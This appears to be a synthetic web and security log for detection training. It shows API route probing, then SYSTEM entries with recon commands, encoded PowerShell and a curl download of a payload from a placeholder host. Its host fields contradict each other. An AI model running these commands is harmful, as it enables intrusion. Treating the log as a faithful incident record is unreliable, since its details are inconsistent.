2026-07-02T09:00:19+05:30 | API | service=api-gateway | user=trainer | ip=10.0.0.5 | GET /api/reports/export | status=204 | rt=262ms | risk=safe:10 | msg="GET /api/reports/export 204 in 262ms (next.js: 49ms, application-code: 168ms)"
2026-07-02T14:55:39+05:30 | WEB | service=auth-service | user=trainer | ip=192.168.1.11 | GET /reports | status=200 | rt=492ms | risk=safe:20 | msg="GET /reports 200 in 492ms (next.js: 13ms, application-code: 404ms)"
2026-07-02T14:55:58+05:30 | API | service=api-gateway | user=support | ip=192.168.1.11 | POST /api/payment | status=200 | rt=231ms | risk=safe:7 | msg="POST /api/payment 200 in 231ms (next.js: 4ms, application-code: 192ms)"
2026-07-02T14:56:38+05:30 | API | service=firewall | user=support | ip=192.168.1.11 | GET /api/v1/unknown-route | status=404 | rt=1026ms | risk=api_route_risk:66 | msg="GET /api/v1/unknown-route?level=beginner&limit=50 404 in 1026ms (next.js: 146ms, application-code: 875ms)"
2026-07-02T14:57:39+05:30 | API | service=windows-host | user=hr_user | ip=88.214.26.18 | GET /api/learning-path-batches | status=404 | rt=1621ms | risk=api_route_risk:50 | msg="GET /api/learning-path-batches?level=beginner&limit=50 404 in 1621ms (next.js: 155ms, application-code: 1585ms)"
2026-07-02T14:58:07+05:30 | API | service=payment-service | user=student02 | ip=192.168.1.10 | GET /api/admin/legacy-users | status=404 | rt=770ms | risk=api_route_risk:64 | msg="GET /api/admin/legacy-users?level=beginner&limit=50 404 in 770ms (next.js: 41ms, application-code: 599ms)"
2026-07-02T14:58:47+05:30 | API | service=load-balancer | user=student01 | ip=172.16.0.33 | GET /api/v1/unknown-route | status=404 | rt=1286ms | risk=api_route_risk:66 | msg="GET /api/v1/unknown-route?level=beginner&limit=50 404 in 1286ms (next.js: 112ms, application-code: 1207ms)"
2026-07-02T14:59:23+05:30 | API | service=linux-host | user=student02 | ip=185.220.101.45 | GET /api/v1/unknown-route | status=404 | rt=1396ms | risk=api_route_risk:46 | msg="GET /api/v1/unknown-route?level=beginner&limit=50 404 in 1396ms (next.js: 90ms, application-code: 1262ms)"
2026-07-02T15:00:19+05:30 | API | service=nginx | user=api_bot | ip=192.168.1.12 | GET /api/v1/unknown-route | status=404 | rt=1096ms | risk=api_route_risk:47 | msg="GET /api/v1/unknown-route?level=beginner&limit=50 404 in 1096ms (next.js: 16ms, application-code: 1065ms)"
2026-07-02T15:01:25+05:30 | API | service=redis | user=manager | ip=203.0.113.90 | GET /api/learning-path-batches | status=404 | rt=1063ms | risk=api_route_risk:61 | msg="GET /api/learning-path-batches?level=beginner&limit=50 404 in 1063ms (next.js: 149ms, application-code: 914ms)"
2026-07-02T15:01:45+05:30 | API | service=worker-service | user=hr_user | ip=10.0.0.5 | GET /api/learning-path-batches | status=404 | rt=1183ms | risk=api_route_risk:65 | msg="GET /api/learning-path-batches?level=beginner&limit=50 404 in 1183ms (next.js: 148ms, application-code: 1156ms)"
2026-07-02T15:02:24+05:30 | API | service=payment-service | user=keerthi | ip=192.168.1.10 | GET /api/admin/legacy-users | status=404 | rt=1260ms | risk=api_route_risk:62 | msg="GET /api/admin/legacy-users?level=beginner&limit=50 404 in 1260ms (next.js: 122ms, application-code: 1145ms)"
2026-07-02T15:03:34+05:30 | API | service=windows-host | user=finance_user | ip=172.16.0.21 | GET /api/admin/legacy-users | status=404 | rt=1672ms | risk=api_route_risk:67 | msg="GET /api/admin/legacy-users?level=beginner&limit=50 404 in 1672ms (next.js: 75ms, application-code: 1649ms)"
2026-07-02T15:04:37+05:30 | API | service=nextjs-app | user=student02 | ip=45.67.21.88 | GET /api/admin/legacy-users | status=404 | rt=654ms | risk=api_route_risk:63 | msg="GET /api/admin/legacy-users?level=beginner&limit=50 404 in 654ms (next.js: 88ms, application-code: 566ms)"
2026-07-02T15:05:46+05:30 | API | service=nextjs-app | user=support | ip=88.214.26.18 | GET /api/v1/unknown-route | status=404 | rt=1363ms | risk=api_route_risk:43 | msg="GET /api/v1/unknown-route?level=beginner&limit=50 404 in 1363ms (next.js: 80ms, application-code: 1198ms)"
2026-07-02T15:06:21+05:30 | API | service=payment-service | user=trainer | ip=10.0.0.8 | GET /api/admin/legacy-users | status=404 | rt=758ms | risk=api_route_risk:70 | msg="GET /api/admin/legacy-users?level=beginner&limit=50 404 in 758ms (next.js: 49ms, application-code: 636ms)"
2026-07-02T15:07:10+05:30 | API | service=scheduler | user=guest | ip=192.168.1.12 | GET /api/admin/legacy-users | status=404 | rt=933ms | risk=api_route_risk:61 | msg="GET /api/admin/legacy-users?level=beginner&limit=50 404 in 933ms (next.js: 52ms, application-code: 798ms)"
2026-07-02T15:07:55+05:30 | API | service=nextjs-app | user=devops | ip=192.168.1.10 | GET /api/learning-path-batches | status=404 | rt=1655ms | risk=api_route_risk:43 | msg="GET /api/learning-path-batches?level=beginner&limit=50 404 in 1655ms (next.js: 151ms, application-code: 1533ms)"
2026-07-02T15:08:05+05:30 | API | service=scheduler | user=hr_user | ip=192.168.1.10 | GET /api/learning-path-batches | status=404 | rt=1043ms | risk=api_route_risk:61 | msg="GET /api/learning-path-batches?level=beginner&limit=50 404 in 1043ms (next.js: 101ms, application-code: 893ms)"
2026-07-02T15:08:55+05:30 | API | service=auth-service | user=trainer | ip=192.168.1.10 | GET /api/learning-path-batches | status=404 | rt=1131ms | risk=api_route_risk:57 | msg="GET /api/learning-path-batches?level=beginner&limit=50 404 in 1131ms (next.js: 143ms, application-code: 1006ms)"
2026-07-02T15:09:30+05:30 | API | service=redis | user=manager | ip=91.240.118.73 | GET /api/v1/unknown-route | status=404 | rt=1025ms | risk=api_route_risk:49 | msg="GET /api/v1/unknown-route?level=beginner&limit=50 404 in 1025ms (next.js: 24ms, application-code: 953ms)"
2026-07-02T15:09:50+05:30 | API | service=scheduler | user=guest | ip=10.0.0.8 | GET /api/learning-path-batches | status=404 | rt=655ms | risk=api_route_risk:58 | msg="GET /api/learning-path-batches?level=beginner&limit=50 404 in 655ms (next.js: 143ms, application-code: 576ms)"
2026-07-02T15:10:13+05:30 | API | service=linux-host | user=trainer | ip=192.168.1.12 | GET /api/v1/unknown-route | status=404 | rt=818ms | risk=api_route_risk:62 | msg="GET /api/v1/unknown-route?level=beginner&limit=50 404 in 818ms (next.js: 6ms, application-code: 744ms)"
2026-07-02T15:10:52+05:30 | API | service=worker-service | user=guest | ip=88.214.26.18 | GET /api/learning-path-batches | status=404 | rt=1087ms | risk=api_route_risk:62 | msg="GET /api/learning-path-batches?level=beginner&limit=50 404 in 1087ms (next.js: 91ms, application-code: 924ms)"
2026-07-02T15:11:54+05:30 | API | service=payment-service | user=support | ip=185.220.101.45 | GET /api/learning-path-batches | status=404 | rt=1244ms | risk=api_route_risk:57 | msg="GET /api/learning-path-batches?level=beginner&limit=50 404 in 1244ms (next.js: 97ms, application-code: 1104ms)"
2026-07-02T15:12:05+05:30 | API | service=auth-service | user=support | ip=192.168.1.10 | GET /api/admin/legacy-users | status=404 | rt=890ms | risk=api_route_risk:50 | msg="GET /api/admin/legacy-users?level=beginner&limit=50 404 in 890ms (next.js: 79ms, application-code: 844ms)"
2026-07-02T15:12:53+05:30 | API | service=api-gateway | user=admin | ip=172.16.0.21 | GET /api/learning-path-batches | status=404 | rt=1139ms | risk=api_route_risk:40 | msg="GET /api/learning-path-batches?level=beginner&limit=50 404 in 1139ms (next.js: 23ms, application-code: 1085ms)"
2026-07-02T15:13:11+05:30 | API | service=nextjs-app | user=analyst | ip=45.67.21.88 | GET /api/admin/legacy-users | status=404 | rt=1479ms | risk=api_route_risk:68 | msg="GET /api/admin/legacy-users?level=beginner&limit=50 404 in 1479ms (next.js: 30ms, application-code: 1451ms)"
2026-07-02T15:14:05+05:30 | API | service=nginx | user=manager | ip=185.220.101.45 | GET /api/learning-path-batches | status=404 | rt=731ms | risk=api_route_risk:54 | msg="GET /api/learning-path-batches?level=beginner&limit=50 404 in 731ms (next.js: 76ms, application-code: 552ms)"
2026-07-02T15:14:15+05:30 | API | service=scheduler | user=analyst | ip=192.168.1.12 | GET /api/admin/legacy-users | status=404 | rt=902ms | risk=api_route_risk:55 | msg="GET /api/admin/legacy-users?level=beginner&limit=50 404 in 902ms (next.js: 102ms, application-code: 733ms)"
2026-07-02T15:14:48+05:30 | API | service=mongodb | user=student02 | ip=172.16.0.33 | GET /api/learning-path-batches | status=404 | rt=1002ms | risk=api_route_risk:57 | msg="GET /api/learning-path-batches?level=beginner&limit=50 404 in 1002ms (next.js: 156ms, application-code: 905ms)"
2026-07-02T15:15:26+05:30 | API | service=api-gateway | user=finance_user | ip=91.240.118.73 | GET /api/v1/unknown-route | status=404 | rt=818ms | risk=api_route_risk:40 | msg="GET /api/v1/unknown-route?level=beginner&limit=50 404 in 818ms (next.js: 158ms, application-code: 688ms)"
2026-07-02T15:15:49+05:30 | API | service=api-gateway | user=trainer | ip=192.168.1.10 | GET /api/v1/unknown-route | status=404 | rt=1340ms | risk=api_route_risk:61 | msg="GET /api/v1/unknown-route?level=beginner&limit=50 404 in 1340ms (next.js: 45ms, application-code: 1285ms)"
2026-07-02T15:16:00+05:30 | API | service=redis | user=trainer | ip=10.0.0.5 | GET /api/learning-path-batches | status=404 | rt=1371ms | risk=api_route_risk:63 | msg="GET /api/learning-path-batches?level=beginner&limit=50 404 in 1371ms (next.js: 35ms, application-code: 1231ms)"
2026-07-02T15:17:00+05:30 | API | service=nextjs-app | user=guest | ip=10.0.0.5 | GET /api/admin/legacy-users | status=404 | rt=735ms | risk=api_route_risk:70 | msg="GET /api/admin/legacy-users?level=beginner&limit=50 404 in 735ms (next.js: 136ms, application-code: 721ms)"
2026-07-02T15:18:08+05:30 | API | service=payment-service | user=support | ip=91.240.118.73 | GET /api/admin/legacy-users | status=404 | rt=1006ms | risk=api_route_risk:61 | msg="GET /api/admin/legacy-users?level=beginner&limit=50 404 in 1006ms (next.js: 53ms, application-code: 829ms)"
2026-07-02T15:18:58+05:30 | API | service=postgresql | user=manager | ip=172.16.0.21 | GET /api/learning-path-batches | status=404 | rt=1194ms | risk=api_route_risk:41 | msg="GET /api/learning-path-batches?level=beginner&limit=50 404 in 1194ms (next.js: 128ms, application-code: 1042ms)"
2026-07-02T15:19:55+05:30 | API | service=scheduler | user=keerthi | ip=172.16.0.21 | GET /api/learning-path-batches | status=404 | rt=1145ms | risk=api_route_risk:60 | msg="GET /api/learning-path-batches?level=beginner&limit=50 404 in 1145ms (next.js: 47ms, application-code: 1100ms)"
2026-07-02T15:20:06+05:30 | API | service=payment-service | user=guest | ip=203.0.113.90 | GET /api/v1/unknown-route | status=404 | rt=1545ms | risk=api_route_risk:46 | msg="GET /api/v1/unknown-route?level=beginner&limit=50 404 in 1545ms (next.js: 149ms, application-code: 1499ms)"
2026-07-02T15:20:49+05:30 | API | service=frontend-browser | user=student02 | ip=203.0.113.90 | GET /api/learning-path-batches | status=404 | rt=1084ms | risk=api_route_risk:64 | msg="GET /api/learning-path-batches?level=beginner&limit=50 404 in 1084ms (next.js: 76ms, application-code: 1044ms)"
2026-07-02T15:21:57+05:30 | API | service=firewall | user=keerthi | ip=192.168.1.11 | GET /api/v1/unknown-route | status=404 | rt=1238ms | risk=api_route_risk:54 | msg="GET /api/v1/unknown-route?level=beginner&limit=50 404 in 1238ms (next.js: 57ms, application-code: 1167ms)"
2026-07-02T15:23:01+05:30 | API | service=windows-host | user=hr_user | ip=91.240.118.73 | GET /api/v1/unknown-route | status=404 | rt=1464ms | risk=api_route_risk:59 | msg="GET /api/v1/unknown-route?level=beginner&limit=50 404 in 1464ms (next.js: 139ms, application-code: 1341ms)"
2026-07-02T15:23:28+05:30 | API | service=nginx | user=analyst | ip=192.168.1.11 | GET /api/learning-path-batches | status=404 | rt=1493ms | risk=api_route_risk:47 | msg="GET /api/learning-path-batches?level=beginner&limit=50 404 in 1493ms (next.js: 67ms, application-code: 1469ms)"
2026-07-02T15:23:48+05:30 | API | service=frontend-browser | user=hr_user | ip=91.240.118.73 | GET /api/v1/unknown-route | status=404 | rt=1642ms | risk=api_route_risk:54 | msg="GET /api/v1/unknown-route?level=beginner&limit=50 404 in 1642ms (next.js: 84ms, application-code: 1583ms)"
2026-07-02T15:24:28+05:30 | API | service=load-balancer | user=devops | ip=172.16.0.21 | GET /api/v1/unknown-route | status=404 | rt=1081ms | risk=api_route_risk:65 | msg="GET /api/v1/unknown-route?level=beginner&limit=50 404 in 1081ms (next.js: 126ms, application-code: 1024ms)"
2026-07-02T15:25:25+05:30 | API | service=nginx | user=keerthi | ip=203.0.113.90 | GET /api/v1/unknown-route | status=404 | rt=1423ms | risk=api_route_risk:51 | msg="GET /api/v1/unknown-route?level=beginner&limit=50 404 in 1423ms (next.js: 152ms, application-code: 1254ms)"
2026-07-02T15:25:46+05:30 | API | service=load-balancer | user=api_bot | ip=91.240.118.73 | GET /api/learning-path-batches | status=404 | rt=856ms | risk=api_route_risk:46 | msg="GET /api/learning-path-batches?level=beginner&limit=50 404 in 856ms (next.js: 22ms, application-code: 771ms)"
2026-07-02T15:26:24+05:30 | API | service=nextjs-app | user=student01 | ip=198.51.100.42 | GET /api/learning-path-batches | status=404 | rt=655ms | risk=api_route_risk:43 | msg="GET /api/learning-path-batches?level=beginner&limit=50 404 in 655ms (next.js: 26ms, application-code: 498ms)"
2026-07-02T15:26:44+05:30 | API | service=auth-service | user=trainer | ip=172.16.0.33 | GET /api/admin/legacy-users | status=404 | rt=770ms | risk=api_route_risk:67 | msg="GET /api/admin/legacy-users?level=beginner&limit=50 404 in 770ms (next.js: 42ms, application-code: 601ms)"
2026-07-02T15:27:11+05:30 | API | service=nextjs-app | user=john | ip=192.168.1.12 | GET /api/admin/legacy-users | status=404 | rt=767ms | risk=api_route_risk:70 | msg="GET /api/admin/legacy-users?level=beginner&limit=50 404 in 767ms (next.js: 128ms, application-code: 626ms)"
2026-07-02T15:27:39+05:30 | API | service=windows-host | user=support | ip=91.240.118.73 | GET /api/v1/unknown-route | status=404 | rt=1384ms | risk=api_route_risk:40 | msg="GET /api/v1/unknown-route?level=beginner&limit=50 404 in 1384ms (next.js: 139ms, application-code: 1269ms)"
2026-07-02T15:28:48+05:30 | API | service=nextjs-app | user=john | ip=203.0.113.90 | GET /api/admin/legacy-users | status=404 | rt=1373ms | risk=api_route_risk:54 | msg="GET /api/admin/legacy-users?level=beginner&limit=50 404 in 1373ms (next.js: 152ms, application-code: 1231ms)"
2026-07-02T15:28:58+05:30 | API | service=auth-service | user=keerthi | ip=103.14.88.2 | GET /api/admin/legacy-users | status=404 | rt=1559ms | risk=api_route_risk:61 | msg="GET /api/admin/legacy-users?level=beginner&limit=50 404 in 1559ms (next.js: 44ms, application-code: 1517ms)"
2026-07-02T15:29:11+05:30 | API | service=mongodb | user=manager | ip=203.0.113.90 | GET /api/learning-path-batches | status=404 | rt=1269ms | risk=api_route_risk:60 | msg="GET /api/learning-path-batches?level=beginner&limit=50 404 in 1269ms (next.js: 110ms, application-code: 1112ms)"
2026-07-02T15:30:00+05:30 | SYSTEM | service=windows-host | host=app-01 | event=process_execution | user=admin | ip=185.220.101.45 | risk=security_risk:78 | msg="process_execution user=admin host=app-01 command="powershell -enc SQBFAFgA" source_ip=185.220.101.45"
2026-07-02T15:30:12+05:30 | API | service=api-gateway | user=trainer | ip=172.16.0.33 | GET /api/learning-path-batches | status=404 | rt=1442ms | risk=api_route_risk:60 | msg="GET /api/learning-path-batches?level=beginner&limit=50 404 in 1442ms (next.js: 50ms, application-code: 1423ms)"
2026-07-02T15:30:32+05:30 | SYSTEM | service=linux-host | host=db-01 | event=process_execution | user=admin | ip=185.220.101.45 | risk=security_risk:84 | msg="process_execution user=admin host=app-01 command="whoami /all" source_ip=185.220.101.45"
2026-07-02T15:31:04+05:30 | SYSTEM | service=windows-host | host=app-01 | event=process_execution | user=admin | ip=185.220.101.45 | risk=security_risk:91 | msg="process_execution user=admin host=app-01 command="net user" source_ip=185.220.101.45"
2026-07-02T15:31:12+05:30 | API | service=frontend-browser | user=student01 | ip=192.168.1.12 | GET /api/v1/unknown-route | status=404 | rt=1601ms | risk=api_route_risk:62 | msg="GET /api/v1/unknown-route?level=beginner&limit=50 404 in 1601ms (next.js: 131ms, application-code: 1434ms)"
2026-07-02T15:31:36+05:30 | SYSTEM | service=linux-host | host=db-01 | event=process_execution | user=admin | ip=185.220.101.45 | risk=security_risk:81 | msg="process_execution user=admin host=app-01 command="systeminfo" source_ip=185.220.101.45"
2026-07-02T15:31:45+05:30 | API | service=nextjs-app | user=api_bot | ip=192.168.1.11 | GET /api/admin/legacy-users | status=404 | rt=1615ms | risk=api_route_risk:62 | msg="GET /api/admin/legacy-users?level=beginner&limit=50 404 in 1615ms (next.js: 133ms, application-code: 1437ms)"
2026-07-02T15:31:55+05:30 | API | service=firewall | user=student01 | ip=91.240.118.73 | GET /api/v1/unknown-route | status=404 | rt=1527ms | risk=api_route_risk:68 | msg="GET /api/v1/unknown-route?level=beginner&limit=50 404 in 1527ms (next.js: 158ms, application-code: 1518ms)"
2026-07-02T15:32:08+05:30 | SYSTEM | service=linux-host | host=app-02 | event=process_execution | user=admin | ip=185.220.101.45 | risk=security_risk:82 | msg="process_execution user=admin host=app-01 command="curl http://unknown-domain.example/payload" source_ip=185.220.101.45"
2026-07-02T15:32:40+05:30 | SYSTEM | service=linux-host | host=app-02 | event=process_execution | user=admin | ip=185.220.101.45 | risk=security_risk:88 | msg="process_execution user=admin host=app-01 command="bash -c id" source_ip=185.220.101.45"
2026-07-02T15:33:00+05:30 | API | service=auth-service | user=trainer | ip=185.220.101.45 | GET /api/admin/legacy-users | status=404 | rt=1256ms | risk=api_route_risk:48 | msg="GET /api/admin/legacy-users?level=beginner&limit=50 404 in 1256ms (next.js: 13ms, application-code: 1116ms)"
2026-07-02T15:33:12+05:30 | SYSTEM | service=windows-host | host=worker-01 | event=process_execution | user=admin | ip=185.220.101.45 | risk=security_risk:88 | msg="process_execution user=admin host=app-01 command="powershell -enc SQBFAFgA" source_ip=185.220.101.45"
2026-07-02T15:33:42+05:30 | API | service=nginx | user=finance_user | ip=10.0.0.8 | GET /api/v1/unknown-route | status=404 | rt=726ms | risk=api_route_risk:49 | msg="GET /api/v1/unknown-route?level=beginner&limit=50 404 in 726ms (next.js: 17ms, application-code: 707ms)"
2026-07-02T15:33:44+05:30 | SYSTEM | service=linux-host | host=web-01 | event=process_execution | user=admin | ip=185.220.101.45 | risk=security_risk:96 | msg="process_execution user=admin host=app-01 command="whoami /all" source_ip=185.220.101.45"
2026-07-02T15:33:55+05:30 | API | service=payment-service | user=student01 | ip=10.0.0.5 | GET /api/v1/unknown-route | status=404 | rt=1274ms | risk=api_route_risk:70 | msg="GET /api/v1/unknown-route?level=beginner&limit=50 404 in 1274ms (next.js: 118ms, application-code: 1142ms)"
2026-07-02T15:34:16+05:30 | SYSTEM | service=windows-host | host=app-01 | event=process_execution | user=admin | ip=185.220.101.45 | risk=security_risk:91 | msg="process_execution user=admin host=app-01 command="net user" source_ip=185.220.101.45"
2026-07-02T15:34:48+05:30 | SYSTEM | service=linux-host | host=app-01 | event=process_execution | user=admin | ip=185.220.101.45 | risk=security_risk:93 | msg="process_execution user=admin host=app-01 command="systeminfo" source_ip=185.220.101.45"
2026-07-02T15:35:04+05:30 | API | service=frontend-browser | user=support | ip=185.220.101.45 | GET /api/v1/unknown-route | status=404 | rt=1630ms | risk=api_route_risk:70 | msg="GET /api/v1/unknown-route?level=beginner&limit=50 404 in 1630ms (next.js: 83ms, application-code: 1513ms)"
2026-07-02T15:35:20+05:30 | SYSTEM | service=linux-host | host=web-01 | event=process_execution | user=admin | ip=185.220.101.45 | risk=security_risk:87 | msg="process_execution user=admin host=app-01 command="curl http://unknown-domain.example/payload" source_ip=185.220.101.45"
2026-07-02T15:35:52+05:30 | SYSTEM | service=linux-host | host=api-01 | event=process_execution | user=admin | ip=185.220.101.45 | risk=security_risk:88 | msg="process_execution user=admin host=app-01 command="bash -c id" source_ip=185.220.101.45"
2026-07-02T15:36:03+05:30 | API | service=firewall | user=admin | ip=88.214.26.18 | GET /api/learning-path-batches | status=404 | rt=986ms | risk=api_route_risk:42 | msg="GET /api/learning-path-batches?level=beginner&limit=50 404 in 986ms (next.js: 121ms, application-code: 923ms)"
2026-07-02T15:36:13+05:30 | API | service=nginx | user=api_bot | ip=172.16.0.33 | GET /api/v1/unknown-route | status=404 | rt=1497ms | risk=api_route_risk:56 | msg="GET /api/v1/unknown-route?level=beginner&limit=50 404 in 1497ms (next.js: 80ms, application-code: 1477ms)"
2026-07-02T15:36:24+05:30 | SYSTEM | service=windows-host | host=app-02 | event=process_execution | user=admin | ip=185.220.101.45 | risk=security_risk:90 | msg="process_execution user=admin host=app-01 command="powershell -enc SQBFAFgA" source_ip=185.220.101.45"
2026-07-02T15:36:56+05:30 | SYSTEM | service=linux-host | host=app-02 | event=process_execution | user=admin | ip=185.220.101.45 | risk=security_risk:88 | msg="process_execution user=admin host=app-01 command="whoami /all" source_ip=185.220.101.45"
2026-07-02T15:37:00+05:30 | API | service=linux-host | user=hr_user | ip=185.220.101.45 | GET /api/v1/unknown-route | status=404 | rt=1037ms | risk=api_route_risk:47 | msg="GET /api/v1/unknown-route?level=beginner&limit=50 404 in 1037ms (next.js: 119ms, application-code: 971ms)"
2026-07-02T15:37:10+05:30 | API | service=linux-host | user=john | ip=192.168.1.10 | GET /api/learning-path-batches | status=404 | rt=761ms | risk=api_route_risk:64 | msg="GET /api/learning-path-batches?level=beginner&limit=50 404 in 761ms (next.js: 108ms, application-code: 622ms)"
2026-07-02T15:37:28+05:30 | SYSTEM | service=windows-host | host=api-01 | event=process_execution | user=admin | ip=185.220.101.45 | risk=security_risk:88 | msg="process_execution user=admin host=app-01 command="net user" source_ip=185.220.101.45"
2026-07-02T15:37:30+05:30 | API | service=frontend-browser | user=analyst | ip=198.51.100.42 | GET /api/learning-path-batches | status=404 | rt=1531ms | risk=api_route_risk:60 | msg="GET /api/learning-path-batches?level=beginner&limit=50 404 in 1531ms (next.js: 79ms, application-code: 1472ms)"
2026-07-02T15:38:00+05:30 | SYSTEM | service=linux-host | host=app-02 | event=process_execution | user=admin | ip=185.220.101.45 | risk=security_risk:79 | msg="process_execution user=admin host=app-01 command="systeminfo" source_ip=185.220.101.45"
2026-07-02T15:38:02+05:30 | API | service=auth-service | user=trainer | ip=198.51.100.42 | GET /api/v1/unknown-route | status=404 | rt=1700ms | risk=api_route_risk:50 | msg="GET /api/v1/unknown-route?level=beginner&limit=50 404 in 1700ms (next.js: 159ms, application-code: 1550ms)"
2026-07-02T15:38:32+05:30 | SYSTEM | service=linux-host | host=app-01 | event=process_execution | user=admin | ip=185.220.101.45 | risk=security_risk:76 | msg="process_execution user=admin host=app-01 command="curl http://unknown-domain.example/payload" source_ip=185.220.101.45"
2026-07-02T15:38:53+05:30 | API | service=auth-service | user=student02 | ip=45.67.21.88 | GET /api/v1/unknown-route | status=404 | rt=1365ms | risk=api_route_risk:53 | msg="GET /api/v1/unknown-route?level=beginner&limit=50 404 in 1365ms (next.js: 19ms, application-code: 1346ms)"
2026-07-02T15:39:04+05:30 | SYSTEM | service=linux-host | host=app-01 | event=process_execution | user=admin | ip=185.220.101.45 | risk=security_risk:96 | msg="process_execution user=admin host=app-01 command="bash -c id" source_ip=185.220.101.45"
2026-07-02T15:39:06+05:30 | API | service=payment-service | user=api_bot | ip=88.214.26.18 | GET /api/admin/legacy-users | status=404 | rt=1562ms | risk=api_route_risk:41 | msg="GET /api/admin/legacy-users?level=beginner&limit=50 404 in 1562ms (next.js: 12ms, application-code: 1397ms)"
2026-07-02T15:39:36+05:30 | SYSTEM | service=windows-host | host=db-01 | event=process_execution | user=admin | ip=185.220.101.45 | risk=security_risk:89 | msg="process_execution user=admin host=app-01 command="powershell -enc SQBFAFgA" source_ip=185.220.101.45"
2026-07-02T15:39:56+05:30 | API | service=payment-service | user=support | ip=91.240.118.73 | GET /api/admin/legacy-users | status=404 | rt=1306ms | risk=api_route_risk:70 | msg="GET /api/admin/legacy-users?level=beginner&limit=50 404 in 1306ms (next.js: 158ms, application-code: 1255ms)"
2026-07-02T15:40:08+05:30 | SYSTEM | service=linux-host | host=web-01 | event=process_execution | user=admin | ip=185.220.101.45 | risk=security_risk:75 | msg="process_execution user=admin host=app-01 command="whoami /all" source_ip=185.220.101.45"
2026-07-02T15:40:40+05:30 | SYSTEM | service=windows-host | host=app-01 | event=process_execution | user=admin | ip=185.220.101.45 | risk=security_risk:92 | msg="process_execution user=admin host=app-01 command="net user" source_ip=185.220.101.45"
2026-07-02T15:41:01+05:30 | API | service=mongodb | user=admin | ip=88.214.26.18 | GET /api/v1/unknown-route | status=404 | rt=1577ms | risk=api_route_risk:46 | msg="GET /api/v1/unknown-route?level=beginner&limit=50 404 in 1577ms (next.js: 61ms, application-code: 1496ms)"
2026-07-02T15:41:12+05:30 | SYSTEM | service=linux-host | host=app-02 | event=process_execution | user=admin | ip=185.220.101.45 | risk=security_risk:77 | msg="process_execution user=admin host=app-01 command="systeminfo" source_ip=185.220.101.45"
2026-07-02T15:41:40+05:30 | API | service=nginx | user=devops | ip=203.0.113.90 | GET /api/admin/legacy-users | status=404 | rt=1061ms | risk=api_route_risk:59 | msg="GET /api/admin/legacy-users?level=beginner&limit=50 404 in 1061ms (next.js: 31ms, application-code: 1028ms)"
2026-07-02T15:41:44+05:30 | SYSTEM | service=linux-host | host=api-01 | event=process_execution | user=admin | ip=185.220.101.45 | risk=security_risk:95 | msg="process_execution user=admin host=app-01 command="curl http://unknown-domain.example/payload" source_ip=185.220.101.45"
2026-07-02T15:41:59+05:30 | API | service=api-gateway | user=finance_user | ip=172.16.0.21 | GET /api/v1/unknown-route | status=404 | rt=1228ms | risk=api_route_risk:69 | msg="GET /api/v1/unknown-route?level=beginner&limit=50 404 in 1228ms (next.js: 40ms, application-code: 1143ms)"
2026-07-02T15:42:16+05:30 | SYSTEM | service=linux-host | host=db-01 | event=process_execution | user=admin | ip=185.220.101.45 | risk=security_risk:81 | msg="process_execution user=admin host=app-01 command="bash -c id" source_ip=185.220.101.45"
2026-07-02T15:42:39+05:30 | API | service=firewall | user=devops | ip=192.168.2.15 | GET /api/admin/legacy-users | status=404 | rt=1132ms | risk=api_route_risk:70 | msg="GET /api/admin/legacy-users?level=beginner&limit=50 404 in 1132ms (next.js: 89ms, application-code: 1106ms)"
2026-07-02T15:42:48+05:30 | SYSTEM | service=windows-host | host=db-01 | event=process_execution | user=admin | ip=185.220.101.45 | risk=security_risk:98 | msg="process_execution user=admin host=app-01 command="powershell -enc SQBFAFgA" source_ip=185.220.101.45"
2026-07-02T15:43:04+05:30 | API | service=payment-service | user=api_bot | ip=192.168.1.11 | GET /api/learning-path-batches | status=404 | rt=1502ms | risk=api_route_risk:67 | msg="GET /api/learning-path-batches?level=beginner&limit=50 404 in 1502ms (next.js: 74ms, application-code: 1406ms)"
2026-07-02T15:43:20+05:30 | SYSTEM | service=linux-host | host=web-01 | event=process_execution | user=admin | ip=185.220.101.45 | risk=security_risk:97 | msg="process_execution user=admin host=app-01 command="whoami /all" source_ip=185.220.101.45"
2026-07-02T15:43:50+05:30 | API | service=frontend-browser | user=support | ip=10.0.0.5 | GET /api/learning-path-batches | status=404 | rt=1267ms | risk=api_route_risk:58 | msg="GET /api/learning-path-batches?level=beginner&limit=50 404 in 1267ms (next.js: 37ms, application-code: 1215ms)"
2026-07-02T15:43:52+05:30 | SYSTEM | service=windows-host | host=db-01 | event=process_execution | user=admin | ip=185.220.101.45 | risk=security_risk:93 | msg="process_execution user=admin host=app-01 command="net user" source_ip=185.220.101.45"
